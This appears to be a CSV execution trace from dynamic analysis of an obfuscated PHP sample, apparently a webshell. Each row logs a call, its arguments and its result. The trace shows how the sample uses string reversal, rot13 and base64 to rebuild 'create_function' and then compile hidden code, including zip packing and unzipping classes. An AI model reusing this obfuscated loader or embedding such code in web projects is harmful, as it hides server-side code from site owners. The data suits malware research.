uuid,file_md5,index,source,target,argc,argv,return,dynamic
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,923,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,924,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""=0aPA0KPX0jBvNQZ4kSZjtUKv4FXcRTquETWb4JMfWUqmOPYaL1Wbf2LuOaYcxvpcETolE3Lxtvoykzp0AUVfpvIatlnwSTphxFXlyTMskzp0ATV+0PVmyTn0EPXz9JM6y""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,925,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,926,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,927,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,928,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,929,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,930,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,931,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,932,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,933,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,934,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,935,hiabug,strrev,1,"{""value"": [[0, ""str"", ""=0aPA0KPX0jBvNQZ4kSZjtUKv4FXcRTquETWb4JMfWUqmOPYaL1Wbf2LuOaYcxvpcETolE3Lxtvoykzp0AUVfpvIatlnwSTphxFXlyTMskzp0ATV+0PVmyTn0EPXz9JM6y""]]}",{"value": "L2kup3ZtMJShqzIlrj0XVPNtVPNtqzSlVPEiqKD9Wlp7QDbtVPNtMaIhL3Eco24tMJShqzIlXPExnKVcrj0XPJyzXROzqJ5wqTyioy9yrTymqUZbW2q6L29gpUWyp3ZaXF"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,936,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""L2kup3ZtMJShqzIlrj0XVPNtVPNtqzSlVPEiqKD9Wlp7QDbtVPNtMaIhL3Eco24tMJShqzIlXPExnKVcrj0XPJyzXROzqJ5wqTyioy9yrTymqUZbW2q6L29gpUWyp3ZaXF""]]}",{"value": "Y2xhc3MgZWFudmVyew0KICAgICAgdmFyICRvdXQ9Jyc7DQogICAgZnVuY3Rpb24gZWFudmVyKCRkaXIpew0KCWlmKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKS"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,937,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Y2xhc3MgZWFudmVyew0KICAgICAgdmFyICRvdXQ9Jyc7DQogICAgZnVuY3Rpb24gZWFudmVyKCRkaXIpew0KCWlmKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKS""]]}",{"value": "class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforea"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,938,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforea""]]}",{"value": "\\x00lambda_43"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,939,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforeach($dir as $file){\r\n\t\tif(is_file($file)){\r\n\t\t\t$filecode = implode('',@file($file));\r\n\t\t\tif(is_array($dir)) $file = basename($file);\r\n\t\t\t$this -> filezip($filecode,$file);\r\n\t\t}\r\n\t}\r\n\t$this->out = $this -> packfile();\r\n\t}\r\n\treturn true;\r\n\t}\r\n\telse return false;\r\n    }\r\n\tvar $datasec      = array();\r\n\tvar $ctrl_dir     = array();\r\n\tvar $eof_ctrl_dir = \""\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\"";\r\n\tvar $old_offset   = 0;\r\n\tfunction at($atunix = 0) {\r\n\t\t$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);\r\n\t\tif ($unixarr['year'] < 1980) {\r\n\t\t\t$unixarr['year']    = 1980;\r\n\t\t\t$unixarr['mon']     = 1;\r\n\t\t\t$unixarr['mday']    = 1;\r\n\t\t\t$unixarr['hours']   = 0;\r\n\t\t\t$unixarr['minutes'] = 0;\r\n\t\t\t$unixarr['seconds'] = 0;\r\n\t\t} \r\n\t\treturn (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |\r\n\t\t\t\t($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);\r\n\t}\r\n\tfunction filezip($data, $name, $time = 0) {\r\n\t\t$name = str_replace('\\\\', '/', $name);\r\n\t\t$dtime = dechex($this->at($time));\r\n\t\t$hexdtime\t= '\\x' . $dtime[6] . $dtime[7]\r\n\t\t\t\t\t. '\\x' . $dtime[4] . $dtime[5]\r\n\t\t\t\t\t. '\\x' . $dtime[2] . $dtime[3]\r\n\t\t\t\t\t. '\\x' . $dtime[0] . $dtime[1];\r\n\t\teval('$hexdtime = \""' . $hexdtime . '\"";');\r\n\t\t$fr\t= \""\\x50\\x4b\\x03\\x04\"";\r\n\t\t$fr\t.= \""\\x14\\x00\"";\r\n\t\t$fr\t.= \""\\x00\\x00\"";\r\n\t\t$fr\t.= \""\\x08\\x00\"";\r\n\t\t$fr\t.= $hexdtime;\r\n\t\t$unc_len = strlen($data);\r\n\t\t$crc = crc32($data);\r\n\t\t$zdata = gzcompress($data);\r\n\t\t$c_len = strlen($zdata);\r\n\t\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$fr .= pack('v', strlen($name));\r\n\t\t$fr .= pack('v', 0);\r\n\t\t$fr .= $name;\r\n\t\t$fr .= $zdata;\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$this -> datasec[] = $fr;\r\n\t\t$new_offset = strlen(implode('', $this->datasec));\r\n\t\t$cdrec = \""\\x50\\x4b\\x01\\x02\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x14\\x00\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x08\\x00\"";\r\n\t\t$cdrec .= $hexdtime;\r\n\t\t$cdrec .= pack('V', $crc);\r\n\t\t$cdrec .= pack('V', $c_len);\r\n\t\t$cdrec .= pack('V', $unc_len);\r\n\t\t$cdrec .= pack('v', strlen($name) );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('V', 32 );\r\n\t\t$cdrec .= pack('V', $this -> old_offset );\r\n\t\t$this -> old_offset = $new_offset;\r\n\t\t$cdrec .= $name;\r\n\t\t$this -> ctrl_dir[] = $cdrec;\r\n\t}\r\n\tfunction packfile(){\r\n\t\t$data    = implode('', $this -> datasec);\r\n\t\t$ctrldir = implode('', $this -> ctrl_dir);\r\n\t\treturn $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data)).\""\\x00\\x00\"";\r\n\t}\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,940,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,941,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""=0aPA0UVX0jByIap0OvolIUqyWKPX0jBv4wpvkGKy1JLhITocM2JlITMuITnx8TqxNvBSkHFTWPViu2LyytPAfmXeNlpykJnz9SouE3o05GYmyTn0EFPX0DPX0DsWbDQ9y""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,942,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,943,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,944,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,945,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,946,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,947,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,948,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,949,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,950,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,951,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,952,hiabug,strrev,1,"{""value"": [[0, ""str"", ""=0aPA0UVX0jByIap0OvolIUqyWKPX0jBv4wpvkGKy1JLhITocM2JlITMuITnx8TqxNvBSkHFTWPViu2LyytPAfmXeNlpykJnz9SouE3o05GYmyTn0EFPX0DPX0DsWbDQ9y""]]}",{"value": "L2kup3ZtrzyjQDc7QDbAPvO2LKVtWUEiqTSfK2McoTImVQ0tZQfAPvO2LKVtWUEiqTSfK2MioTEypaZtCFNjBlNAPt0XVTM1ozA0nJ9hVRI4qUWuL3DtXPNxrz4fVPE0ol"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,953,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""L2kup3ZtrzyjQDc7QDbAPvO2LKVtWUEiqTSfK2McoTImVQ0tZQfAPvO2LKVtWUEiqTSfK2MioTEypaZtCFNjBlNAPt0XVTM1ozA0nJ9hVRI4qUWuL3DtXPNxrz4fVPE0ol""]]}",{"value": "Y2xhc3MgemlwDQp7DQoNCiB2YXIgJHRvdGFsX2ZpbGVzID0gMDsNCiB2YXIgJHRvdGFsX2ZvbGRlcnMgPSAwOyANCg0KIGZ1bmN0aW9uIEV4dHJhY3QgKCAkem4sICR0by"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,954,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Y2xhc3MgemlwDQp7DQoNCiB2YXIgJHRvdGFsX2ZpbGVzID0gMDsNCiB2YXIgJHRvdGFsX2ZvbGRlcnMgPSAwOyANCg0KIGZ1bmN0aW9uIEV4dHJhY3QgKCAkem4sICR0by""]]}","{""value"": ""class zip\r\n{\r\n\r\n var $total_files = 0;\r\n var $total_folders = 0; \r\n\r\n function Extract ( $zn, $to, $index = Array(-1) )\r\n {\r\n   $o""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,955,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""class zip\r\n{\r\n\r\n var $total_files = 0;\r\n var $total_folders = 0; \r\n\r\n function Extract ( $zn, $to, $index = Array(-1) )\r\n {\r\n   $o""]]}",{"value": "\\x00lambda_44"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,956,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){class zip\r\n{\r\n\r\n var $total_files = 0;\r\n var $total_folders = 0; \r\n\r\n function Extract ( $zn, $to, $index = Array(-1) )\r\n {\r\n   $ok = 0; $zip = @fopen($zn,'rb');\r\n   if(!$zip) return(-1);\r\n   $cdir = $this->ReadCentralDir($zip,$zn);\r\n   $pos_entry = $cdir['offset'];\r\n\r\n   if(!is_array($index)){ $index = array($index);  }\r\n   for($i=0; $index[$i];$i++){\r\n   \t\tif(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])\r\n\t\treturn(-1);\r\n   }\r\n   for ($i=0; $i<$cdir['entries']; $i++)\r\n   {\r\n     @fseek($zip, $pos_entry);\r\n     $header = $this->ReadCentralFileHeaders($zip);\r\n     $header['index'] = $i; $pos_entry = ftell($zip);\r\n     @rewind($zip); fseek($zip, $header['offset']);\r\n     if(in_array(\""-1\"",$index)||in_array($i,$index))\r\n     \t$stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);\r\n   }\r\n   fclose($zip);\r\n   return $stat;\r\n }\r\n\r\n  function ReadFileHeader($zip)\r\n  {\r\n    $binary_data = fread($zip, 30);\r\n    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);\r\n\r\n    $header['filename'] = fread($zip, $data['filename_len']);\r\n    if ($data['extra_len'] != 0) {\r\n      $header['extra'] = fread($zip, $data['extra_len']);\r\n    } else { $header['extra'] = ''; }\r\n\r\n    $header['compression'] = $data['compression'];$header['size'] = $data['size'];\r\n    $header['compressed_size'] = $data['compressed_size'];\r\n    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];\r\n    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];\r\n\r\n    if ($header['mdate'] && $header['mtime']){\r\n     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;\r\n     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;\r\n     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;\r\n     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);\r\n    }else{$header['mtime'] = time();}\r\n\r\n    $header['stored_filename'] = $header['filename'];\r\n    $header['status'] = \""ok\"";\r\n    return $header;\r\n  }\r\n\r\n function ReadCentralFileHeaders($zip){\r\n    $binary_data = fread($zip, 46);\r\n    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);\r\n\r\n    if ($header['filename_len'] != 0)\r\n      $header['filename'] = fread($zip,$header['filename_len']);\r\n    else $header['filename'] = '';\r\n\r\n    if ($header['extra_len'] != 0)\r\n      $header['extra'] = fread($zip, $header['extra_len']);\r\n    else $header['extra'] = '';\r\n\r\n    if ($header['comment_len'] != 0)\r\n      $header['comment'] = fread($zip, $header['comment_len']);\r\n    else $header['comment'] = '';\r\n\r\n    if ($header['mdate'] && $header['mtime'])\r\n    {\r\n      $hour = ($header['mtime'] & 0xF800) >> 11;\r\n      $minute = ($header['mtime'] & 0x07E0) >> 5;\r\n      $seconde = ($header['mtime'] & 0x001F)*2;\r\n      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;\r\n      $month = ($header['mdate'] & 0x01E0) >> 5;\r\n      $day = $header['mdate'] & 0x001F;\r\n      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);\r\n    } else {\r\n      $header['mtime'] = time();\r\n    }\r\n    $header['stored_filename'] = $header['filename'];\r\n    $header['status'] = 'ok';\r\n    if (substr($header['filename'], -1) == '/')\r\n      $header['external'] = 0x41FF0010;\r\n    return $header;\r\n }\r\n\r\n function ReadCentralDir($zip,$zip_name){\r\n\t$size = filesize($zip_name);\r\n\r\n\tif ($size < 277) $maximum_size = $size;\r\n\telse $maximum_size=277;\r\n\t\r\n\t@fseek($zip, $size-$maximum_size);\r\n\t$pos = ftell($zip); $bytes = 0x00000000;\r\n\t\r\n\twhile ($pos < $size){\r\n\t\t$byte = @fread($zip, 1); $bytes=($bytes << 8) | ord($byte);\r\n\t\tif ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506){ $pos++;break;} $pos++;\r\n\t}\r\n\t\r\n\t$fdata=fread($zip,18);\r\n\t\r\n\t$data=@unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',$fdata);\r\n\t\r\n\tif ($data['comment_size'] != 0) $centd['comm""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,957,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,958,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""=0aPAfGXvL1q2xmXnqKMcWKJSuTpT9vnycTBMWwHepyr1LUpm40AKcKA2O3ZBqmI6IwqjAwG3ZRIFEaoIqIrAqUZ25zrGWQGYS0qjcKrdSKHwWzoYSRZiAmI1xyrkyTJDO""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,959,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,960,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,961,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,962,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,963,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,964,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,965,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,966,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,967,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,968,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,969,hiabug,strrev,1,"{""value"": [[0, ""str"", ""=0aPAfGXvL1q2xmXnqKMcWKJSuTpT9vnycTBMWwHepyr1LUpm40AKcKA2O3ZBqmI6IwqjAwG3ZRIFEaoIqIrAqUZ25zrGWQGYS0qjcKrdSKHwWzoYSRZiAmI1xyrkyTJDO""]]}",{"value": "MaIhL3Eco24tp3EupaEsqJ56nKNbWUE0YPE0oKOsozSgMFjxozI3K25uoJHfWUEiMTylCFq6nKOznJkyWly7QDccMvtxqUD9CFpkWly7QDbtVPNtVPNtVPE6VQ0tozI3VS"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,970,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tp3EupaEsqJ56nKNbWUE0YPE0oKOsozSgMFjxozI3K25uoJHfWUEiMTylCFq6nKOznJkyWly7QDccMvtxqUD9CFpkWly7QDbtVPNtVPNtVPE6VQ0tozI3VS""]]}",{"value": "ZnVuY3Rpb24gc3RhcnRfdW56aXAoJHR0LCR0bXBfbmFtZSwkbmV3X25hbWUsJHRvZGlyPSd6aXBmaWxlJyl7DQppZigkdHQ9PScxJyl7DQogICAgICAgICR6ID0gbmV3IF"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,971,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gc3RhcnRfdW56aXAoJHR0LCR0bXBfbmFtZSwkbmV3X25hbWUsJHRvZGlyPSd6aXBmaWxlJyl7DQppZigkdHQ9PScxJyl7DQogICAgICAgICR6ID0gbmV3IF""]]}","{""value"": ""function start_unzip($tt,$tmp_name,$new_name,$todir='zipfile'){\r\nif($tt=='1'){\r\n        $z = new Zip;\r\n\t\t$have_zip_file=0;\r\n\t\t$upf""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,972,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function start_unzip($tt,$tmp_name,$new_name,$todir='zipfile'){\r\nif($tt=='1'){\r\n        $z = new Zip;\r\n\t\t$have_zip_file=0;\r\n\t\t$upf""]]}",{"value": "\\x00lambda_45"},"[0, 0]"
